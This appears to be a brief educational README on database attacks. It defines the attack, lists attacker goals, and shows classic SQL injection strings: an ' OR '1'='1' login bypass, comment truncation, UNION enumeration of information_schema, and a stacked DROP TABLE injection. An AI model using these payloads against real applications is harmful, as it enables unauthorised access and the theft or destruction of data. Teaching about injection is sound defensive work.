# database hacking attack

![image](https://github.com/user-attachments/assets/e1c77952-3368-4f4e-afd9-733de720be3c)


## What a database attack?
a database attack is: A malicious attempt to access, manipulate, steal or destroy data stored in a 
database management system (DBMS) by exploiting vulnerabilities in configuration, application logic or code.

## Main objectives of an attack:
@ Stealing sensitive information (e.g. user data, credit cards, credentials)

@ Change or delete data

@ Take control of the server

@ Gain unauthorised access to restricted areas

## 1.comands 
```shell
! SELECT * FROM utenti WHERE username = '' OR '1'='1' AND password = '';
```
 Allowing access without valid credentials.

## 2. Unauthorized access: Using ' OR '1'='1' -, the query could be

```shell
SELECT * FROM utenti WHERE username = '' OR '1'='1' --' AND password = '';
```
The comment (--) ignores the rest of the query, allowing access.

## 3.Table Enumeration: An attacker might try to discover the database tables with:

```shell
$ UNION SELECT table_name, null FROM information_schema.tables;
```
## Running dangerous commands: By entering '; DROP TABLE users; -, the query could become:
```shell
$ SELECT * FROM utenti WHERE username = ''; DROP TABLE utenti; --' AND password = '';
```
